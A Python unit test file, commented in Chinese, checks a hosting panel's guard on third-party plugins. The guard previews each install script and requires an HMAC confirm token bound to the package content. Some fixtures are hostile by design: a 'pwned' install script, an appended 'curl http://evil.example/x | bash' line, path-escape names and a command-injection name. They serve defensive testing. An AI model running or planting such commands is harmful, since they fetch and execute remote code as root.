# coding: utf-8
"""P2-11 第三方插件包信任边界守卫（轻量方案：安装前展示脚本 + 二次确认 + 内容绑定凭据）。

报告 P2 第 11 条「插件包无签名校验」：第三方 zip 里的 `install.sh` 会被
`web/utils/plugin.py::plugin.install()` 以 **root** 身份执行，但此前既没有「安装前让
人看清将执行什么」的环节，也没有任何确认凭据 —— 信任边界完全等于登录态。

本轮按用户既定口径落**轻量方案（不建签名体系）**：

1. 上传/导入第三方包时解析将被 root 执行的脚本（`info.json.shell`，默认 `install.sh`）
   与 name/version/ps 等关键字段，回给前端展示；
2. 安装该包时必须携带一个**与包内容强绑定**的确认凭据 `confirm_token`
   （`HMAC(服务端密钥, 插件名 + 包内容 sha256)`），否则拒绝安装且**不产生**安装任务；
3. 包内容（含 install.sh / info.json）一旦变化，旧 token 立即失效；
4. 面板自带 `plugins/` 目录的官方插件与既有白名单渠道**不受影响**，安装成功率不变。

断言策略：能真跑的（`install` / `confirmPreview` / `inputZipApi` / `initInstall` /
`_plugin_package_hash` / `_plugin_confirm_token` / `_plugin_script_name`）一律用真实代码
+ 隔离库跑；路由与前端用 `ast.unparse` 与 JS 大括号切片断言（注释 / 字符串蒙混不过去）。

变异自证见 `test/p2_pluginsign_mutation_probe.py`（把每处修复单点回退，本守卫必须变红）。
"""
import ast
import json
import os
import shutil
import sys
import tempfile
import unittest
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
# 变异探针把仓库文件复制到临时树，用 YF_P2_11_ROOT 指向它；正常门禁不设该变量。
ROOT = os.environ.get('YF_P2_11_ROOT') or os.path.dirname(HERE)
WEB = os.path.join(ROOT, 'web')
for _p in (WEB, ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import core.yf as yf  # noqa: E402
from testsuite._isolation import isolate  # noqa: E402

# 进程级隔离：必须早于 import thisdb / utils.plugin（它们在导入期就会打开面板库）
_PANEL_TMP, _SERVER_TMP = isolate('p2_11_pluginsign')

import thisdb  # noqa: E402
import utils.plugin as plugin_util  # noqa: E402
from utils.plugin import plugin as PluginCls  # noqa: E402

PLUGIN_PY = os.path.join('web', 'utils', 'plugin.py')
PLUGINS_ROUTE = os.path.join('web', 'admin', 'plugins', '__init__.py')
SOFT_JS = os.path.join('web', 'static', 'app', 'soft.js')

INSTALL_SH = '#!/bin/bash\necho pwned > /tmp/p2_11_pwned\n'


def _read(rel):
    with open(os.path.join(ROOT, rel), encoding='utf-8') as fh:
        return fh.read()


def _route_fn(name):
    tree = ast.parse(_read(PLUGINS_ROUTE))
    for node in tree.body:
        if isinstance(node, ast.FunctionDef) and node.name == name:
            return node
    raise AssertionError('路由函数 %s 不存在' % name)


def _unparse(fn):
    return ast.unparse(fn)


def _mask_js(src):
    """把 JS 注释/字符串/正则字面量的内容换成空格（长度不变），只看代码结构。

    `addVersion` 的字符串里有 `'{"status":false'` 这样的字面花括号，直接用大括号计数
    会把函数体截断 —— 必须先掩码。
    """
    buf = list(src)
    i, n = 0, len(src)
    quote = None

    def _blank(a, b):
        for k in range(a, min(b, n)):
            if buf[k] != '\n':
                buf[k] = ' '

    def _prev_code_ch():
        for k in range(i - 1, -1, -1):
            if src[k] in ' \t\r\n':
                continue
            return src[k]
        return ''

    while i < n:
        ch = src[i]
        if quote:
            if ch == '\\':
                _blank(i, i + 2)
                i += 2
                continue
            if ch == quote:
                quote = None
                _blank(i, i + 1)
                i += 1
                continue
            _blank(i, i + 1)
            i += 1
            continue
        if ch in ('"', "'"):
            quote = ch
            _blank(i, i + 1)
            i += 1
            continue
        if ch == '/' and i + 1 < n and src[i + 1] == '/':
            start = i
            while i < n and src[i] != '\n':
                i += 1
            _blank(start, i)
            continue
        if ch == '/' and i + 1 < n and src[i + 1] == '*':
            start = i
            i += 2
            while i + 1 < n and not (src[i] == '*' and src[i + 1] == '/'):
                i += 1
            i += 2
            _blank(start, i)
            continue
        if ch == '/' and _prev_code_ch() in '(,=:[!&|?{};':
            start = i
            i += 1
            while i < n:
                if src[i] == '\\':
                    i += 2
                    continue
                if src[i] == '/':
                    i += 1
                    break
                i += 1
            while i < n and src[i].isalpha():
                i += 1
            _blank(start, i)
            continue
        i += 1
    return ''.join(buf)


def _js_func_src(src, name):
    """JS 函数源码（先掩码注释/字符串，再大括号配对切片）。"""
    masked = _mask_js(src)
    start = masked.find('function %s(' % name)
    if start < 0:
        raise AssertionError('未找到 JS 函数 %s' % name)
    brace = masked.find('{', start)
    if brace < 0:
        raise AssertionError('JS 函数 %s 缺少函数体' % name)
    depth = 0
    for i in range(brace, len(masked)):
        if masked[i] == '{':
            depth += 1
        elif masked[i] == '}':
            depth -= 1
            if depth == 0:
                return src[start:i + 1]
    raise AssertionError('JS 函数 %s 大括号不配对' % name)


def _fake_plugin(plugin_dir, name, install_sh=INSTALL_SH, extra=None):
    """在给定 plugins 目录里造一个最小可用插件。"""
    path = os.path.join(plugin_dir, name)
    os.makedirs(path, exist_ok=True)
    info = {
        'name': name,
        'title': 'P2-11 fake',
        'shell': 'install.sh',
        'versions': '1.0',
        'checks': 'server/%s' % name,
        'path': 'server/%s' % name,
    }
    if extra:
        info.update(extra)
    with open(os.path.join(path, 'info.json'), 'w', encoding='utf-8') as fh:
        json.dump(info, fh)
    with open(os.path.join(path, 'install.sh'), 'w', encoding='utf-8', newline='\n') as fh:
        fh.write(install_sh)
    return path


class _InstallHarness(unittest.TestCase):
    """install()/confirmPreview() 的行为断言基座：真实代码 + 隔离库 + 任务替身。"""

    def setUp(self):
        self.plugin_dir = tempfile.mkdtemp(prefix='p2_11_plugins_')
        self.inst = PluginCls()
        self.inst._plugin__plugin_dir = self.plugin_dir
        self.tasks = []
        self.triggered = []
        thisdb.setOption(plugin_util._PLUGIN_THIRD_PARTY_OPTION, json.dumps([]))
        self._patches = [
            mock.patch.object(plugin_util.thisdb, 'addTask', side_effect=self._add_task),
            mock.patch.object(plugin_util.yf, 'triggerTask',
                              side_effect=lambda: self.triggered.append(1)),
            mock.patch.object(plugin_util.yf, 'writeFileLog', lambda *a, **k: None),
            mock.patch.object(plugin_util.yf, 'debugLog', lambda *a, **k: None),
        ]
        for p in self._patches:
            p.start()

    def tearDown(self):
        for p in reversed(self._patches):
            p.stop()
        thisdb.setOption(plugin_util._PLUGIN_THIRD_PARTY_OPTION, json.dumps([]))
        shutil.rmtree(self.plugin_dir, ignore_errors=True)

    def _add_task(self, name=None, cmd=None, type='execshell', status=0):
        self.tasks.append({'name': name, 'cmd': cmd})
        return True

    def _plugin_path(self, name):
        return os.path.join(self.plugin_dir, name)

    def _token(self, name):
        return plugin_util._plugin_confirm_token(
            name, plugin_util._plugin_package_hash(self._plugin_path(name)))

    def _mark_third_party(self, name):
        plugin_util._mark_plugin_third_party(name)


class HashBindingTest(_InstallHarness):
    """凭据与包内容强绑定的底层保证。"""

    def test_01_hash_is_deterministic_and_content_sensitive(self):
        _fake_plugin(self.plugin_dir, 'p2hash')
        path = self._plugin_path('p2hash')
        h1 = plugin_util._plugin_package_hash(path)
        self.assertEqual(h1, plugin_util._plugin_package_hash(path), '同一内容必须得到同一哈希')
        with open(os.path.join(path, 'install.sh'), 'a', encoding='utf-8', newline='\n') as fh:
            fh.write('echo tampered\n')
        self.assertNotEqual(h1, plugin_util._plugin_package_hash(path),
                            'install.sh 变化后哈希必须变化（否则 token 不绑内容）')

    def test_02_token_binds_name_and_content(self):
        _fake_plugin(self.plugin_dir, 'p2a')
        _fake_plugin(self.plugin_dir, 'p2b')
        ha = plugin_util._plugin_package_hash(self._plugin_path('p2a'))
        hb = plugin_util._plugin_package_hash(self._plugin_path('p2b'))
        ta = plugin_util._plugin_confirm_token('p2a', ha)
        self.assertNotEqual(ta, plugin_util._plugin_confirm_token('p2a', hb),
                            'token 必须随内容变化')
        self.assertNotEqual(ta, plugin_util._plugin_confirm_token('p2b', ha),
                            'token 必须随插件名变化')
        self.assertEqual(ta, plugin_util._plugin_confirm_token('p2a', ha), '确定性')

    def test_03_script_name_rejects_path_escape(self):
        for bad in ('../evil.sh', '/etc/x', 'a/b.sh', '..', '\\x', 'a..b/c'):
            self.assertIsNone(plugin_util._plugin_script_name({'shell': bad}),
                              '非法 shell 必须拒绝: %r' % bad)
        self.assertEqual(plugin_util._plugin_script_name({'shell': 'install.sh'}), 'install.sh')
        self.assertEqual(plugin_util._plugin_script_name({}), 'install.sh', '缺省为 install.sh')
        self.assertEqual(plugin_util._plugin_script_name({'shell': ''}), 'install.sh',
                         '空 shell 回退到 install.sh')


class InstallTokenGateTest(_InstallHarness):
    """安装闸门：第三方必须带有效 token；官方不受影响。"""

    def test_04_official_install_without_token_still_queues(self):
        """官方插件（未登记第三方）不弹确认、不需 token —— 安装成功率不变。"""
        _fake_plugin(self.plugin_dir, 'okplug')
        rdata = self.inst.install('okplug', '1.0')
        self.assertIs(rdata['status'], True, rdata)
        self.assertEqual(len(self.tasks), 1)
        self.assertEqual(self.triggered, [1])

    def test_05_third_party_without_token_is_rejected_without_task(self):
        _fake_plugin(self.plugin_dir, 'p2tp')
        self._mark_third_party('p2tp')
        rdata = self.inst.install('p2tp', '1.0')
        self.assertIs(rdata['status'], False, rdata)
        self.assertEqual(self.tasks, [], '未确认不得产生安装任务')
        self.assertEqual(self.triggered, [], '未确认不得触发任务队列')

    def test_06_third_party_with_wrong_token_is_rejected(self):
        _fake_plugin(self.plugin_dir, 'p2tp')
        self._mark_third_party('p2tp')
        for bad in ('deadbeef', '0' * 64, self._token('p2tp') + 'x'):
            rdata = self.inst.install('p2tp', '1.0', confirm_token=bad)
            self.assertIs(rdata['status'], False, '错误 token 必须被拒: %r' % bad)
        self.assertEqual(self.tasks, [])

    def test_07_third_party_with_valid_token_is_queued(self):
        _fake_plugin(self.plugin_dir, 'p2tp')
        self._mark_third_party('p2tp')
        rdata = self.inst.install('p2tp', '1.0', confirm_token=self._token('p2tp'))
        self.assertIs(rdata['status'], True, rdata)
        self.assertEqual(len(self.tasks), 1)
        self.assertIn('p2tp', self.tasks[0]['cmd'])
        self.assertEqual(self.triggered, [1])

    def test_08_old_token_invalid_after_content_change(self):
        """包内容（install.sh）被篡改后，旧 token 必须失效。"""
        path = _fake_plugin(self.plugin_dir, 'p2tp')
        self._mark_third_party('p2tp')
        token = self._token('p2tp')
        self.assertIs(self.inst.install('p2tp', '1.0', confirm_token=token)['status'], True)
        self.tasks.clear()
        with open(os.path.join(path, 'install.sh'), 'a', encoding='utf-8', newline='\n') as fh:
            fh.write('curl http://evil.example/x | bash\n')
        rdata = self.inst.install('p2tp', '1.0', confirm_token=token)
        self.assertIs(rdata['status'], False, '内容变化后旧 token 必须失效: %r' % rdata)
        self.assertEqual(self.tasks, [], '失效 token 不得产生安装任务')

    def test_09_init_install_skips_third_party(self):
        """init_install 是另一条入队通道，不得成为绕过确认的后门。"""
        _fake_plugin(self.plugin_dir, 'p2tp')
        self._mark_third_party('p2tp')
        rdata = self.inst.initInstall(json.dumps([{'name': 'p2tp', 'version': '1.0'}]))
        self.assertIs(rdata['status'], False, rdata)
        self.assertEqual(self.tasks, [], '推荐安装不得替第三方插件入队')


class ConfirmPreviewTest(_InstallHarness):
    """展示接口：返回将被执行的脚本文本 + info.json 关键字段 + 凭据。"""

    def test_10_preview_returns_exact_script_text(self):
        _fake_plugin(self.plugin_dir, 'p2tp', install_sh=INSTALL_SH)
        self._mark_third_party('p2tp')
        rdata = self.inst.confirmPreview('p2tp')
        self.assertIs(rdata['status'], True, rdata)
        data = rdata['data']
        self.assertIs(data['require_confirm'], True)
        self.assertEqual(data['install_sh'], INSTALL_SH,
                         '展示的脚本文本必须与 zip 内的 install.sh 逐字一致')
        self.assertEqual(data['shell'], 'install.sh')
        self.assertEqual(data['versions'], '1.0')
        # 预览签发的 token 必须真能过闸门
        self.assertIs(self.inst.install('p2tp', '1.0',
                                        confirm_token=data['confirm_token'])['status'], True)

    def test_11_preview_official_needs_no_confirm(self):
        _fake_plugin(self.plugin_dir, 'okplug')
        rdata = self.inst.confirmPreview('okplug')
        self.assertIs(rdata['status'], True, rdata)
        self.assertIs(rdata['data']['require_confirm'], False,
                      '官方插件不得被强制二次确认')

    def test_12_preview_refuses_unresolvable_script(self):
        """无法展示（shell 指向插件目录外 / 文件不存在）时不得签发凭据。"""
        _fake_plugin(self.plugin_dir, 'p2tp', extra={'shell': '../evil.sh'})
        self._mark_third_party('p2tp')
        rdata = self.inst.confirmPreview('p2tp')
        self.assertIs(rdata['status'], False, '不可解析的脚本不得签发确认凭据: %r' % rdata)

    def test_13_preview_rejects_bad_name(self):
        for bad in ('', '../etc', 'a/b', 'a;id'):
            self.assertIs(self.inst.confirmPreview(bad)['status'], False, 'name=%r' % bad)


class ZipImportTokenTest(unittest.TestCase):
    """inputZipApi 导入第三方包：登记来源 + 回传脚本与内容绑定 token。"""

    def setUp(self):
        self.panel_dir = tempfile.mkdtemp(prefix='p2_11_panel_')
        self.plugins_dir = os.path.join(self.panel_dir, 'plugins')
        os.makedirs(self.plugins_dir, exist_ok=True)
        self.temp_dir = os.path.join(self.panel_dir, 'temp')
        self.pkg_dir = os.path.join(self.temp_dir, 'pkg')
        os.makedirs(self.pkg_dir, exist_ok=True)
        self.inst = PluginCls()
        self.inst._plugin__plugin_dir = self.plugins_dir
        thisdb.setOption(plugin_util._PLUGIN_THIRD_PARTY_OPTION, json.dumps([]))
        self._patches = [
            mock.patch.object(plugin_util.yf, 'getPanelDir', return_value=self.panel_dir),
            mock.patch.object(plugin_util.yf, 'getPluginDir', return_value=self.plugins_dir),
            mock.patch.object(plugin_util.yf, 'writeFileLog', lambda *a, **k: None),
            mock.patch.object(plugin_util.yf, 'writeLog', lambda *a, **k: None),
        ]
        for p in self._patches:
            p.start()

    def tearDown(self):
        for p in reversed(self._patches):
            p.stop()
        thisdb.setOption(plugin_util._PLUGIN_THIRD_PARTY_OPTION, json.dumps([]))
        shutil.rmtree(self.panel_dir, ignore_errors=True)

    def test_14_import_marks_third_party_and_returns_script_and_token(self):
        pkg = _fake_plugin(self.pkg_dir, 'p2pkg', install_sh=INSTALL_SH)
        rdata = self.inst.inputZipApi('p2pkg', pkg)
        self.assertIs(rdata['status'], True, rdata)
        self.assertTrue(plugin_util._plugin_is_third_party('p2pkg'),
                        '导入第三方包后必须登记为第三方来源')
        data = rdata['data']
        self.assertEqual(data['install_sh'], INSTALL_SH)
        self.assertIs(data['require_confirm'], True)
        expected = plugin_util._plugin_confirm_token(
            'p2pkg', plugin_util._plugin_package_hash(os.path.join(self.plugins_dir, 'p2pkg')))
        self.assertEqual(data['confirm_token'], expected)

    def test_15_import_does_not_mark_official_style_name(self):
        """未走导入通道的插件不被登记（官方插件路径不受影响）。"""
        self.assertFalse(plugin_util._plugin_is_third_party('okplug'))


class RouteAndFrontendGuardTest(unittest.TestCase):
    """接入点：路由必须收 token，前端必须展示脚本并二次确认后才带 token 安装。"""

    def test_16_install_route_reads_and_passes_confirm_token(self):
        code = _unparse(_route_fn('install'))
        self.assertIn('confirm_token', code)
        self.assertIn("request.form.get('confirm_token'", code.replace('"', "'"))
        self.assertIn('confirm_token=confirm_token', code)

    def test_17_confirm_preview_route_exists(self):
        code = _unparse(_route_fn('confirm_preview'))
        self.assertIn('confirmPreview', code)
        self.assertIn('/confirm_preview', _read(PLUGINS_ROUTE))

    def test_18_frontend_shows_script_and_requires_name(self):
        src = _read(SOFT_JS)
        body = _js_func_src(src, 'installPluginScriptConfirm')
        self.assertIn('/plugins/confirm_preview', body)
        self.assertIn('install_sh', body, '必须展示将被执行的 install.sh')
        self.assertIn('require_confirm', body)
        self.assertIn('yf_confirm_plugin_name', body, '必须要求管理员输入插件名二次确认')
        self.assertIn('!== name', body, '输入的插件名必须与目标插件严格比对')
        self.assertIn('confirm_token', body)

    def test_19_frontend_install_carries_token(self):
        src = _read(SOFT_JS)
        for fn in ('addVersion', 'softUpdate'):
            body = _js_func_src(src, fn)
            self.assertIn('installPluginScriptConfirm', body,
                          '%s 必须先走安装前确认' % fn)
            self.assertIn('confirm_token', body,
                          '%s 必须把确认凭据带给 /plugins/install' % fn)

    def test_20_import_dialog_shows_script(self):
        body = _js_func_src(_read(SOFT_JS), 'importPlugin')
        self.assertIn('install_sh', body, '导入弹窗必须展示将执行的脚本')


if __name__ == '__main__':
    unittest.main()
